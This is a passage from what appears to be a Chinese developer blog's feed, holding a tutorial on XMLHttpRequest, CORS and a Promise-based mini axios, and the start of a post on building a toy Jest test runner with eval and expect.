      <link href="/2022/06/26/Axios/"/>
      <url>/2022/06/26/Axios/</url>
      <content type="html"><![CDATA[<h3 id="1-Ajax"><a href="#1-Ajax" class="headerlink" title="1. Ajax"></a>1. Ajax</h3><h4 id="1-1-发送请求"><a href="#1-1-发送请求" class="headerlink" title="1.1 发送请求"></a>1.1 发送请求</h4><p>创建XHR对象后，用的第一个方法是open()，open方法不会真正发送请求，而只是启动一个请求已备发送。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'example.php'</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">'MyHeader'</span>, <span class="string">'MyValue'</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-监听请求状态"><a href="#1-2-监听请求状态" class="headerlink" title="1.2 监听请求状态"></a>1.2 监听请求状态</h4><p>XHR的<em><code>readyState</code></em>属性，表示请求/响应过程的当前活动阶段。只要readyState属性的值由一个值变成另一个值，都会触发一次<em><code>readystatechange</code></em>事件。</p><ul><li>0: 未初始化，尚未调用open()方法</li><li>1: 启动，已经调用open()方法，但尚未调用send()方法</li><li>2: 发送，已经调用send()方法， 当尚未接收到响应</li><li>3: 接收，已经接收到部分响应数据</li><li>4: 完成，已经接收到全部响应数据，而且已经可以在客户端使用了。</li></ul><p><br></p><h4 id="1-3-读取返回内容"><a href="#1-3-读取返回内容" class="headerlink" title="1.3 读取返回内容"></a>1.3 读取返回内容</h4><p>请求发出后，javascript代码会等到服务器响应之后再继续执行。在收到响应后，<em><code>xhr.readyState == 4</code></em>, 响应的数据会自动填充XHR对象的属性。相关属性</p><ul><li>xhr.responseText: 作为响应主题被返回的文本</li><li>xhr.responseXML: 如果响应的内容类型是text/xml, application/xml，这个属性中将保存包含着响应数据的XML DOM文档</li><li>xhr.status: 响应的HTTP状态</li><li>xhr.statusText: HTTP状态的说明</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span> || xhr.status == <span class="number">304</span>) &#123;</span><br><span class="line">      alert(xhr.responseText)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      alert(<span class="string">"Request was unsuccessful:"</span> + xhr.status )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-4-取消请求"><a href="#1-4-取消请求" class="headerlink" title="1.4 取消请求"></a>1.4 取消请求</h4><p>在接收到响应之前，还可以调用<em><code>xhr.abort()</code></em>方法来取消异步请求。</p><p><br></p><h4 id="1-5-设置请求头"><a href="#1-5-设置请求头" class="headerlink" title="1.5 设置请求头"></a>1.5 设置请求头</h4><p>默认情况下，在发送XHR请求的同时，会发送下列头部信息。</p><ul><li>Accept: 浏览器能够处理的内容类型</li><li>Accept-Charset: 浏览器能够显示的字符集</li><li>Accept-Encoding: 浏览器能够处理的压缩编码</li><li>Accept-Language: 浏览器当前设置的语言</li><li>Connection: 浏览器与服务器之间连接的类型</li><li>Cookie: 当前页面设置的任何cookie</li><li>Host: 发出请求的页面所在的域</li><li>Referer: 发出请求的页面的URI</li><li>User-Agent: 浏览器的用户代理字符串</li></ul><p>有的浏览器允许开发人员重写默认的头部信息，有的浏览器不允许这样做。建议使用自定义的头部字段，否则有可能会影响服务器的响应。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置请求头</span></span><br><span class="line">xhr.setRequestHeader(<span class="string">'myHeader'</span>, <span class="string">'myValue'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取响应头部信息</span></span><br><span class="line"><span class="keyword">var</span> myHeader = xhr.getResponseHeader(<span class="string">'myHeader'</span>);</span><br><span class="line"><span class="keyword">var</span> allHeaders = xhr.getAllResponseHeaders();  <span class="comment">// 返回多行文本内容</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-5-GET-POST"><a href="#1-5-GET-POST" class="headerlink" title="1.5 GET/POST"></a>1.5 GET/POST</h4><ul><li><p>GET请求<br>GET请求，将查询字符串参数追加到url的末尾，查询字符串的每个参数key,value都需使用<em><code>encodeURIComponent()</code></em>进行编码。所有键值对需由 &amp; 分隔。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于';/?:@&amp;=+$,#这些字符，在encodeURIComponent中统统会被编码。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addURLParam</span>(<span class="params">url, key, value</span>) </span>&#123;</span><br><span class="line">  url += (url.indexOf(<span class="string">"?"</span>) == <span class="number">-1</span> ? <span class="string">"?"</span> : <span class="string">"&amp;"</span>);</span><br><span class="line">  url += <span class="built_in">encodeURIComponent</span>(key) + <span class="string">'='</span> + encodeURILComponent(value);</span><br><span class="line">  <span class="keyword">return</span> url</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">'example.php'</span>;</span><br><span class="line">url = addURLParam(url, <span class="string">"name"</span>, <span class="string">"Nicholas"</span>);</span><br><span class="line">url = addURLParam(url, <span class="string">"book"</span>, <span class="string">"Marketing"</span>);</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">'get'</span>, url, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></li><li><p>POST请求<br>POST请求把数据作为请求的主体提交，数据通过<code>xhr.send(data)</code>传入。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// formData</span></span><br><span class="line"><span class="comment">// Content-type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line">data.append(<span class="string">'name'</span>, <span class="string">'Nicholas'</span>);</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">'post'</span>, <span class="string">'postexample.php'</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xhr.send(data);</span><br><span class="line"></span><br><span class="line"><span class="comment">// json</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-6-进度事件"><a href="#1-6-进度事件" class="headerlink" title="1.6 进度事件"></a>1.6 进度事件</h4><ul><li>loadstart: 在接收到响应数据的第一字节时触发</li><li>error: 在请求发生错误时触发</li><li>abort: 调用abort()后触发</li><li>load: 在接收到完整的响应数据时触发</li><li>loadend: 通信完成，或触发error, abort, load事件后触发</li><li>progress: 在接收响应期间持续不断地触发。事件会收到一个event对象，其target属性是xhr对象，包含着三个额外的属性: </li></ul><p><em><code>lengthComputable</code></em> 进度信息是否可用的布尔值,<br><em><code>position</code></em> 已经接收到的字节数,<br><em><code>totalSize</code></em> 根据Content-length响应头部确定的预期字节数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xhr.onprogress = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> divStatus = <span class="built_in">document</span>.getElementById(<span class="string">'status'</span>);</span><br><span class="line">  <span class="keyword">if</span> (event.lengthComputable) &#123;</span><br><span class="line">    divStatus.innerHTML = <span class="string">"Received"</span> + event.position + <span class="string">"of"</span> + event.totalSize + <span class="string">"bytes"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-7-跨域请求"><a href="#1-7-跨域请求" class="headerlink" title="1.7 跨域请求"></a>1.7 跨域请求</h4><h5 id="1-7-1-CORS"><a href="#1-7-1-CORS" class="headerlink" title="1.7.1 CORS"></a>1.7.1 CORS</h5><p>CORS(Cross-Origin Resource Sharing, 跨源资源共享), 在发送请求时，附加一个Origin请求头，值为请求页面的源信息(协议，域名和端口)，以便服务器根据这个头部信息来决定是否给予响应。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Origin"</span>, <span class="string">"http://www.nczonline.net"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Firefox, safari, chrome无需额外编写代码，就可以触发CORS行, IE要用XDR对象</span></span><br><span class="line"><span class="comment">// xhr.open()里传入绝对url</span></span><br><span class="line">xhr.open(<span class="string">"get"</span>, <span class="string">"http://www.somewhere-else.com/page/"</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></p><p>如果服务器认为这个请求可以接受，就在<em><code>Access-Control-Allow-Origin</code></em>头部中返回相同的源信息。注意：请求和响应都不包含cookie信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://www.nczonline.net</span><br></pre></td></tr></table></figure></p><p>CORS存在一些安全限制</p><ul><li>不能使用setRequestHeader()设置自定义头部</li><li>不能发送和接收cookie</li><li>调用getAllResponseHeaders()方法总会返回空字符串</li></ul><p><br></p><h5 id="1-7-2-Preflighted-Request"><a href="#1-7-2-Preflighted-Request" class="headerlink" title="1.7.2 Preflighted Request"></a>1.7.2 Preflighted Request</h5><p>CORS 通过一种叫做 Preflighted Requests 的透明服务器验证机制<em>支持开发人员使用自定义的头部、 GET 或 POST 之外的方法，以及不同类型的主体内容</em>。在使用下列高级选项来发送请求时，就会向服务 器发送一个 Preflight 请求。这种请求使用 OPTIONS 方法，发送下列头部。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Origin:与简单的请求相同。</span><br><span class="line">Access-Control-Request-Method:请求自身使用的方法。</span><br><span class="line">Access-Control-Request-Headers:(可选)自定义的头部信息，多个头部以逗号分隔。</span><br></pre></td></tr></table></figure></p><p>服务器通过响应中返回如下头部<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin:与简单的请求相同。</span><br><span class="line">Access-Control-Allow-Methods:允许的方法，多个方法以逗号分隔。</span><br><span class="line">Access-Control-Allow-Headers:允许的头部，多个头部以逗号分隔。</span><br><span class="line">Access-Control-Max-Age:应该将这个 Preflight 请求缓存多长时间(以秒表示)。</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="1-7-3-withCredentials"><a href="#1-7-3-withCredentials" class="headerlink" title="1.7.3 withCredentials"></a>1.7.3 withCredentials</h5><p>默认情况下，跨源资源不提供凭据(cookie, HTTP认证，SSL证明)。通过将<em><code>withCredential</code></em>属性设为true, 可以指定某个请求应该发送凭证。如果服务端接受凭据的请求，会用下面的HTTP头部来响应。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></p><p>如果服务器的响应中没有包含这个头部，那么浏览器就不会把响应交给 JavaScript(于是，responseText 中将是空字符串，status 的值为 0，而且会调用 onerror()事件处 理程序)。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCORSRequest</span>(<span class="params">method, url</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">"withCredentials"</span> <span class="keyword">in</span> xhr)&#123;</span><br><span class="line">    xhr.open(method, url, <span class="literal">true</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> XDomainRequest != <span class="string">"undefined"</span>)&#123;</span><br><span class="line">    xhr = <span class="keyword">new</span> XDomainRequest();</span><br><span class="line">    xhr.open(method, url); </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    xhr = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> xhr; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> request = createCORSRequest(<span class="string">"get"</span>,<span class="string">"http://www.somewhere-else.com/page/"</span>); </span><br><span class="line">request.send();</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="1-7-4-其他跨域技术"><a href="#1-7-4-其他跨域技术" class="headerlink" title="1.7.4 其他跨域技术"></a>1.7.4 其他跨域技术</h5><p><br></p><h3 id="2-实现Axios"><a href="#2-实现Axios" class="headerlink" title="2. 实现Axios"></a>2. 实现Axios</h3><p>用Promise实现一个简单的axios<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Axios</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; url, method, data &#125; = obj;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(method, url);</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (xhr.readyState !== <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">        resolve(xhr.response)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        reject(xhr.statuText)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send(data);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用的时候就可以用<code>.then()</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  url: <span class="string">'https://cnodejs.org/api/v1/topics'</span>,</span><br><span class="line">  method: <span class="string">'GET'</span>,</span><br><span class="line">  data: <span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">axios(obj)</span><br><span class="line">  .then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response)</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.jianshu.com/p/874350b5aee7" target="_blank" rel="noopener">JS: 用 Promise 写一个 axios</a></li><li>《Javascript高级程序设计》XMLHttpRequest</li><li><a href="https://juejin.im/post/5aedd4a2f265da0b9d781b85" target="_blank" rel="noopener">如何实现一个HTTP请求库——axios源码阅读与分析</a></li><li><a href="https://juejin.im/post/5d5ccdd75188255625591357" target="_blank" rel="noopener">axios如何利用promise无痛刷新token</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Jest运行前端单元测试(实现Jest、expect、mock)</title>
      <link href="/2022/04/24/jest/"/>
      <url>/2022/04/24/jest/</url>
      <content type="html"><![CDATA[<p>单元测试是对软件中的最小可测试单元在与软件其他部分相隔离的情况下进行的代码级测试。这里的最小可测试单元，通常指函数、接口。它们有明确的输入和输出，为了保证代码逻辑正确，我们需要列举所有输入，并检查它们的输出是否符合预期，来完成单测。</p><p>问题来了，前端都是UI组件，可以做单测吗？怎么测？要测什么？</p><p>其实为一个前端应用做单元测试和为函数、接口做测试，并没有什么明显的区别。想象一下，把用户的点击行为作为输入，把组件渲染出来的HTML作为输出，不就可以验证代码的正确性了吗！</p><p>所以，前端的单测用例，大概是这样的：</p><ul><li>加载一个UI组件</li><li>检查组件渲染出来的HTML 是否符合预期</li><li>触发点击事件</li><li>检查是否调用了接口，调用参数是否正确</li><li>设定接口返回的数据</li><li>接口数据返回后，检查组件渲染出来的 HTML 是否符合预期<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mount &#125; <span class="keyword">from</span> <span class="string">'@vue/test-utils'</span></span><br><span class="line"><span class="keyword">import</span> api <span class="keyword">from</span> <span class="string">'@src/api.js'</span></span><br><span class="line"><span class="keyword">import</span> Login <span class="keyword">from</span> <span class="string">'../src/Login.vue'</span></span><br><span class="line"></span><br><span class="line">describe(<span class="string">'登录组件'</span>, () =&gt;&#123;</span><br><span class="line">  <span class="keyword">const</span> wrapper = mount(Login)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'点击登陆按钮'</span>, <span class="keyword">async</span>() =&gt; &#123;</span><br><span class="line">    <span class="comment">// 提前定义服务端返回内容</span></span><br><span class="line">    jest</span><br><span class="line">      .spyOn(api, <span class="string">'login'</span>)</span><br><span class="line">      .mockImplementation(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(&#123; <span class="attr">status</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟用户操作</span></span><br><span class="line">    <span class="keyword">await</span> wrapper.find(<span class="string">'.button'</span>).trigger(<span class="string">'click'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查调用API,调用参数是否正确</span></span><br><span class="line">    expect(api.login.mock.calls[<span class="number">0</span>][<span class="number">0</span>]).toEqual(&#123;</span><br><span class="line">      userName: <span class="string">'Mike'</span>,</span><br><span class="line">      passwork: <span class="string">'123456'</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查页面是否正常显示</span></span><br><span class="line">    expect(wrapper.text()).toBe(<span class="string">'登录成功'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><p>有非常多的工具和框架，可以辅助我们完成上述的单元测试，本文以 Jest 为例，讲一下前端单元测试如何编写和执行。</p><p><br></p><h3 id="1-Jest简介"><a href="#1-Jest简介" class="headerlink" title="1. Jest简介"></a>1. Jest简介</h3><p>Jest 是 Facebook 开源的一套用来创建、执行测试用例的 JavaScript 测试库。它提供一个独立的、具有浏览器上下文的Node进程来执行单元测试，同时集成了断言、Mock、Stub等 API 用于编写测试用例。为了说明白 Jest 是：</p><ul><li>如何加载UI组件（项目代码）？</li><li>如何触发用户点击行为？</li><li>如何获取页面HTML？</li><li>如何检查一个函数有没有被调用，以什么样的参数被调用？</li></ul><p>下面，我们实现一个简易版的 Jest !</p><p><br></p><h3 id="2-实现Jest"><a href="#2-实现Jest" class="headerlink" title="2.实现Jest"></a>2.实现Jest</h3><p>假设我们要跑一条单测用例，它是一个断言语句<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.spec.jsexpect(<span class="number">2</span> + <span class="number">2</span>).toBe(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></p><p>为了判断这条单测能否通过，我们需要</p><ul><li>通过 <code>fs.readFile</code> 拿到 <code>test.spec.js</code> 里的代码片段 <code>code</code></li><li>执行 <code>eval(code)</code>，代码片段 <code>code</code> 被执行</li><li><code>try catch</code> 一下 <code>eval(code)</code>，没有报错则表示单测通过，catch 到 error 则表示单测不通过</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">runTest</span> (<span class="params">testFile</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> code = <span class="keyword">await</span> fs.promises.readFile(testFile, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">eval</span>(code);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Test Success'</span>)</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Test Fail: <span class="subst">$&#123;error.message&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">runTest(<span class="string">'./test.spec.js'</span>)</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-实现Expect"><a href="#3-实现Expect" class="headerlink" title="3.实现Expect"></a>3.实现Expect</h3><p>现在，我们在命令行里跑一下 <code>node index.js</code> , 会提示 <code>Test Fail: expect is not defined</code>。 代码片段被执行了，但是此时 node 环境里还没有 <code>expect</code> 方法，我们定义一个 <code>expect</code> 方法用于断言。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> expect = <span class="function">(<span class="params">received</span>) =&gt;</span> (&#123;</span><br><span class="line">  toBe: <span class="function">(<span class="params">expected</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (received !== expected) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`Expected <span class="subst">$&#123;expected&#125;</span> but received <span class="subst">$&#123;received&#125;</span>.`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">runTest</span> (<span class="params">testFile</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> code = <span class="keyword">await</span> fs.promises.readFile(testFile, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">eval</span>(code);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Test Success'</span>)</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Test Fail: <span class="subst">$&#123;error.message&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">runTest(<span class="string">'./test.spec.js'</span>)</span><br></pre></td></tr></table></figure></p><p>当测试用例为<code>expect(2 + 2).toBe(4)</code>，执行 <code>node index.js</code>，可以看到打印出来的是 <code>Test Success</code></p><p>我们把测试用例改成<code>expect(2 + 2).toBe(3)</code>，执行 <code>node index.js</code>，可以看到打印出来的是 <code>Test Fail : Expected 3 but received 4</code></p><p>看，一个简易版 Jest 就跑起来了！!</p><p>可以看到，在 Node 环境里执行 <code>eval(code)</code>，当 <code>code</code> 是原生 JS 代码时，非常顺畅没有问题。但要知道，我们要跑的 <code>code</code> 是项目代码文件，那都是一堆是 <code>.vue</code> 文件, <code>.ts</code> 文件，里面有很多 Node 不支持的语法，如 <code>JSX, TypeScript,  Vue 模板</code>。</p><p>为了使 <code>eval(code)</code> 顺利执行，我们需要将项目代码转化成原生JS。至于怎么转化，这里就不详细解释。实际项目中，通过配置 <code>jest.config.js</code> 的 <code>tranform</code> 属性，Jest会帮我们完成转化。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jest.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    transform: &#123;</span><br><span class="line">        <span class="string">'.*\\.(vue)$'</span>: <span class="string">'@vue/vue3-jest'</span>, <span class="comment">// 用@vue/vue3-jest将.vue文件里的代码编译成原生JS</span></span><br><span class="line">        <span class="string">'^.+\\.js$'</span>: <span class="string">'babel-jest'</span>, <span class="comment">// 用babel-jest将.js文件里的代码编译成原生JS</span></span><br><span class="line">        <span class="string">'^.+\\.ts$'</span>: <span class="string">'ts-jest'</span>, <span class="comment">// 用ts-jest将.ts文件里的代码编译成原生JS</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到了原生 JS 代码，也不代表 <code>eval(code)</code>可以顺利执行。前端代码中往往包含了大量的 <code>DOM</code> 操作。这些浏览器提供的 API 需要在 node 环境内提前定义好，才能保证 <code>eval(code)</code>顺利执行。</p><p>Jest 也在 Node 进程里内置了 <code>JSDom</code>，它会将<code>document</code> 对象、 <code>window</code> 对象、 其他 <code>DOM API</code>注入 <code>Node.js</code> 环境里，这样我们就可以在 V8 的上下文中编译和执行 js 代码。</p><p>有了上面的基础后，我们可以开始测试 UI 组件了!</p><p><br></p><h3 id="4-组件测试-Vue-Util-Test"><a href="#4-组件测试-Vue-Util-Test" class="headerlink" title="4.组件测试: Vue 